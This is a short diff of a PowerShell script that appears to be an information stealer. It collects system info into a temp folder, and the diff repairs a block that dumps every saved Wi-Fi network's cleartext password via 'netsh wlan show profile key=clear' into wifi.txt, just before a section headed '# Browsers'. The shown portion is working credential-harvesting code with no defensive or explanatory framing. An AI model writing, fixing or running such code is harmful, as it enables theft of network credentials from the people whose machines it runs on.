@@ -20,12 +20,18 @@ $info=@{
 }
 $info|ConvertTo-Json|Out-File "$T\system_info.txt" -Encoding UTF8
 
-# Wi-Fi passwords
+# Wi-Fi passwords (FIXED)
 try{
     $profiles=(netsh wlan show profiles|Select-String ':'|%{$_.ToString().Split(':')[1].Trim()})
+    $wifiList=@()
     foreach($p in $profiles){
         $pass=(netsh wlan show profile name="`"$p`"" key=clear|Select-String 'Key Content')
-        if($pass){"$p : $($pass.ToString().Split(':')[1].Trim())"}}|Out-File "$T\wifi.txt" -Encoding UTF8
+        if($pass){
+            $password=$pass.ToString().Split(':')[1].Trim()
+            $wifiList += "$p : $password"
+        }
+    }
+    $wifiList|Out-File "$T\wifi.txt" -Encoding UTF8
 }catch{}
 
 # Browsers
